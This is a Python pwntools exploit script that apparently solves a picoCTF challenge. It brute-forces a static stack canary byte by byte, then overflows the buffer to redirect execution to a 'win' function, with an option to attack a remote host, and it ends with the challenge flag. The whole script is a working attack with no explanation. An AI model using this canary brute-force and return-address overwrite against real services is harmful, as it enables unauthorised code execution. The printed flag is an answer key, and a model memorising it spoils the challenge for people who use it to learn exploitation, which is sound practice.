from pwn import *
import sys

def start(argv=[], *a, **kw):
   if args.R:
      return remote(sys.argv[1],sys.argv[2] ,level='warn')
   else:
      return process(elf.path, level='warn')

# canary brute force
def brute_canary(buffer_size,canary):
    for i in range(256):
        print(f'Brute forcing canary: {canary+chr(i)}',end='\r')
        conn = start()
        conn.sendlineafter(b'> ', str(buffer_size).encode())
        conn.sendlineafter(b'Input> ', ('A'*(buffer_size-1-len(canary)) +canary+ chr(i)).encode())
        if b'Ok... Now Where\'s the Flag?' in conn.recvall():
            return chr(i)
        conn.close()

elf = ELF('./vuln',checksec=False)
win = elf.symbols['win']

canary = ''
for i in range(1,5):
    canary += brute_canary(64+i,canary)
print('Canary:',canary)

conn = start()
conn.sendlineafter(b'> ', str(72+16).encode())
conn.sendlineafter(b'Input> ', b'A'*64 + canary.encode() +b'B'*16+ p32(win))
conn.interactive()
# picoCTF{Stat1C_c4n4r13s_4R3_b4D_fba9d49b}